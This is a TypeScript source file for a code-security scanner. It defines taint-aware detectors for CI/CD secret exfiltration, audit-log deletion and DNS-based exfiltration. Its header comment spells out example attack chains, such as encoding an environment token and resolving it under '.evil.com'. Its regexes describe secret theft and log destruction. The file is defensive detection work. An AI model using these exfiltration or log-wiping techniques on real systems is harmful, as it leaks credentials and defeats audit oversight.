/**
 * Secret Exfiltration Flow Detector — Deep analysis for L9, K2, G7
 *
 * Traces multi-step exfiltration: secret source → encoding → network sink.
 * Uses taint analysis to find actual data flows, not pattern proximity.
 *
 * What this catches that YAML regex can't:
 * - L9: process.env.TOKEN → Buffer.from().toString('base64') → fetch(url + encoded)
 * - K2: config.auditDir → fs.unlinkSync(path) — audit trail destruction via tainted path
 * - G7: secret → dns.resolve(encoded + '.evil.com') — DNS-based exfiltration
 */

import type { TypedRule, TypedFinding } from "../base.js";
import { registerTypedRule } from "../base.js";
import type { AnalysisContext } from "../../engine.js";
import { analyzeASTTaint, type ASTTaintFlow } from "../analyzers/taint-ast.js";
import { analyzeTaint, type TaintFlow } from "../analyzers/taint.js";

function isTestFile(source: string): boolean {
  return /(?:__tests?__|\.(?:test|spec)\.)/.test(source);
}

function getLineNumber(source: string, index: number): number {
  return source.substring(0, index).split("\n").length;
}

// ─── L9: CI/CD Secret Exfiltration ────────────────────────────────────────

class CISecretExfilRule implements TypedRule {
  readonly id = "L9";
  readonly name = "CI/CD Secret Exfiltration (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];

    // Phase 1: AST taint — find env/secret sources flowing to network/log sinks
    try {
      const astFlows = analyzeASTTaint(context.source_code);

      // Secret → network exfil
      const exfilFlows = astFlows.filter(
        (f) => f.source.category === "environment" &&
          (f.sink.category === "ssrf" || f.sink.category === "dns_exfil") &&
          !f.sanitized
      );

      for (const flow of exfilFlows) {
        findings.push({
          rule_id: "L9",
          severity: "critical",
          evidence:
            `[AST taint] Environment variable "${flow.source.expression}" (L${flow.source.line}) ` +
            `flows to network sink "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
            `${flow.path.length} propagation step(s). ` +
            `CI/CD secret exfiltration: env var data sent to external endpoint.`,
          remediation:
            "Never send environment variables (tokens, API keys) to external endpoints. " +
            "Use ::add-mask:: in GitHub Actions to prevent log exposure. " +
            "Audit all fetch/http calls in CI scripts for env var usage.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: {
            analysis_type: "ast_taint",
            source_line: flow.source.line,
            sink_line: flow.sink.line,
            sink_category: flow.sink.category,
          },
        });
      }

      // Secret → log exposure
      const logFlows = astFlows.filter(
        (f) => f.source.category === "environment" &&
          f.sink.category === "xss" && // console.log/print mapped to xss in taint engine
          !f.sanitized
      );

      for (const flow of logFlows) {
        // Only flag if the logged expression contains secret-like variable names
        const hasSecretRef = /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|API_KEY|NPM_TOKEN/i.test(
          flow.source.expression + " " + flow.path.map((s) => s.expression).join(" ")
        );

        if (hasSecretRef) {
          findings.push({
            rule_id: "L9",
            severity: "high",
            evidence:
              `[AST taint] Secret env var "${flow.source.expression}" (L${flow.source.line}) ` +
              `flows to log output (L${flow.sink.line}). CI logs may expose this secret. ` +
              `CVE-2025-30066: tj-actions secret exfiltration via workflow logs.`,
            remediation:
              "Never log environment variables containing secrets. " +
              "Use ::add-mask:: in GitHub Actions. Redact before logging.",
            owasp_category: "MCP07-insecure-config",
            mitre_technique: "AML.T0057",
            confidence: flow.confidence * 0.85,
            metadata: { analysis_type: "ast_taint", source_line: flow.source.line },
          });
        }
      }
    } catch {
      // Fall through to lightweight taint
    }

    // Phase 2: Lightweight taint for Python CI scripts
    if (findings.length === 0) {
      const taintFlows = analyzeTaint(context.source_code);
      const envToNetwork = taintFlows.filter(
        (f) => f.source.category === "environment" &&
          f.sink.category === "url_request" &&
          !f.sanitized
      );

      for (const flow of envToNetwork) {
        findings.push({
          rule_id: "L9",
          severity: "critical",
          evidence:
            `[Taint] Env var "${flow.source.expression}" (L${flow.source.line}) → ` +
            `network request (L${flow.sink.line}). Secret exfiltration risk.`,
          remediation:
            "Remove network calls that reference environment secrets. " +
            "Use dedicated secret management, not env vars in HTTP requests.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: { analysis_type: "taint" },
        });
      }
    }

    // Phase 3: Regex fallback — bulk env dump patterns
    if (findings.length === 0) {
      const bulkDump = /(?:Object\.keys|JSON\.stringify|vars|dict)\s*\(\s*(?:process\.env|os\.environ)\s*\)/g;
      const match = bulkDump.exec(context.source_code);
      if (match) {
        const line = getLineNumber(context.source_code, match.index);
        findings.push({
          rule_id: "L9",
          severity: "high",
          evidence:
            `[Regex fallback] Bulk environment dump at line ${line}: "${match[0]}". ` +
            `Serializing all env vars risks exposing secrets in logs or network responses.`,
          remediation: "Never serialize the entire process.env/os.environ. Select specific safe variables.",
          owasp_category: "MCP07-insecure-config",
          mitre_technique: "AML.T0057",
          confidence: 0.70,
          metadata: { analysis_type: "regex_fallback", line },
        });
      }
    }

    return findings;
  }
}

// ─── K2: Audit Trail Destruction ──────────────────────────────────────────

class AuditTrailDestructionRule implements TypedRule {
  readonly id = "K2";
  readonly name = "Audit Trail Destruction (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];
    const source = context.source_code;

    // Phase 1: AST taint — find paths from audit/log config to file deletion sinks
    try {
      const astFlows = analyzeASTTaint(source);
      const deleteFlows = astFlows.filter(
        (f) => f.sink.category === "file_write" &&
          /unlink|rm|truncate|remove/i.test(f.sink.expression)
      );

      for (const flow of deleteFlows) {
        // Check if the path being deleted is audit/log related
        const isAuditPath = /audit|log|journal|record|trace|event/i.test(
          flow.source.expression + " " + flow.path.map((s) => s.expression).join(" ") + " " + flow.sink.expression
        );

        if (isAuditPath) {
          findings.push({
            rule_id: "K2",
            severity: "critical",
            evidence:
              `[AST taint] Audit path deletion: "${flow.source.expression}" (L${flow.source.line}) → ` +
              `delete operation "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
              `Audit trail destruction violates ISO 27001 A.8.15 and EU AI Act Art. 12.`,
            remediation:
              "Never delete audit/log files programmatically. Use log rotation (logrotate) with " +
              "retention policies instead. Audit logs must be append-only per compliance requirements.",
            owasp_category: "MCP09-logging-monitoring",
            mitre_technique: "AML.T0054",
            confidence: flow.confidence * 0.90,
            metadata: { analysis_type: "ast_taint" },
          });
        }
      }
    } catch {
      // Fall through
    }

    // Phase 2: Direct pattern — fs.unlink/rm on audit paths
    if (findings.length === 0) {
      const patterns = [
        { regex: /(?:unlink|unlinkSync|rm|rmSync|truncate|truncateSync)\s*\([^)]*(?:audit|log|journal)/gi, desc: "delete audit/log file" },
        { regex: /(?:unlink|unlinkSync|rm|rmSync)\s*\([^)]*(?:\.log|\.audit|\/logs\/|\/audit\/)/gi, desc: "delete .log/.audit file" },
        { regex: /(?:truncate|truncateSync)\s*\([^)]*(?:\.log|\.audit)/gi, desc: "truncate log file" },
        { regex: /os\.(?:remove|unlink)\s*\([^)]*(?:audit|log|journal)/gi, desc: "Python delete audit file" },
      ];

      for (const { regex, desc } of patterns) {
        regex.lastIndex = 0;
        const match = regex.exec(source);
        if (match) {
          const line = getLineNumber(source, match.index);
          // Exclude log rotation
          const lineText = source.split("\n")[line - 1] || "";
          if (/rotate|archive|backup|compress|gzip/i.test(lineText)) continue;

          findings.push({
            rule_id: "K2",
            severity: "critical",
            evidence:
              `[Pattern] ${desc} at line ${line}: "${match[0].slice(0, 80)}". ` +
              `Audit log deletion detected. Taint analysis could not confirm path source.`,
            remediation:
              "Use log rotation instead of file deletion. Audit logs must be retained " +
              "per ISO 27001 A.8.15 and EU AI Act Art. 12.",
            owasp_category: "MCP09-logging-monitoring",
            mitre_technique: "AML.T0054",
            confidence: 0.75,
            metadata: { analysis_type: "regex_fallback", line },
          });
          break;
        }
      }
    }

    return findings;
  }
}

// ─── G7: DNS-Based Data Exfiltration ──────────────────────────────────────

class DNSExfiltrationRule implements TypedRule {
  readonly id = "G7";
  readonly name = "DNS-Based Data Exfiltration (Taint-Aware)";

  analyze(context: AnalysisContext): TypedFinding[] {
    if (!context.source_code) return [];
    if (isTestFile(context.source_code)) return [];

    const findings: TypedFinding[] = [];

    // Phase 1: AST taint — secret data flowing to DNS resolution
    try {
      const astFlows = analyzeASTTaint(context.source_code);
      const dnsFlows = astFlows.filter(
        (f) => f.sink.category === "dns_exfil" && !f.sanitized
      );

      for (const flow of dnsFlows) {
        findings.push({
          rule_id: "G7",
          severity: "critical",
          evidence:
            `[AST taint] Data from "${flow.source.expression}" (L${flow.source.line}) ` +
            `flows to DNS resolution "${flow.sink.expression.slice(0, 60)}" (L${flow.sink.line}). ` +
            `DNS exfiltration encodes data in subdomain queries, bypassing HTTP firewalls and DLP.`,
          remediation:
            "Block DNS resolution of dynamically constructed hostnames. " +
            "Use allowlists for DNS queries. Monitor for high-entropy subdomain patterns.",
          owasp_category: "MCP04-data-exfiltration",
          mitre_technique: "AML.T0057",
          confidence: flow.confidence,
          metadata: { analysis_type: "ast_taint" },
        });
      }
    } catch {
      // Fall through
    }

    // Phase 2: Pattern — DNS query with encoded/concatenated data
    if (findings.length === 0) {
      const patterns = [
        { regex: /dns\.resolve\s*\(\s*`[^`]*\$\{/g, desc: "DNS resolve with template literal (dynamic subdomain)" },
        { regex: /dns\.resolve\s*\([^)]*\+\s*(?!['"`])\w+/g, desc: "DNS resolve with concatenated variable" },
        { regex: /(?:nslookup|dig|host)\s+[^;\n]*\$\{/g, desc: "DNS CLI tool with variable injection" },
      ];

      for (const { regex, desc } of patterns) {
        regex.lastIndex = 0;
        const match = regex.exec(context.source_code);
        if (match) {
          const line = getLineNumber(context.source_code, match.index);
          findings.push({
            rule_id: "G7",
            severity: "critical",
            evidence:
              `[Pattern] ${desc} at line ${line}: "${match[0].slice(0, 80)}". ` +
              `Dynamic DNS queries can encode stolen data in subdomain labels.`,
            remediation:
              "Never construct DNS hostnames from runtime data. " +
              "Use static hostnames only. DNS exfiltration bypasses all HTTP-layer security.",
            owasp_category: "MCP04-data-exfiltration",
            mitre_technique: "AML.T0057",
            confidence: 0.80,
            metadata: { analysis_type: "regex_fallback", line },
          });
          break;
        }
      }
    }

    return findings;
  }
}

// ─── Register ──────────────────────────────────────────────────────────────

registerTypedRule(new CISecretExfilRule());
registerTypedRule(new AuditTrailDestructionRule());
registerTypedRule(new DNSExfiltrationRule());
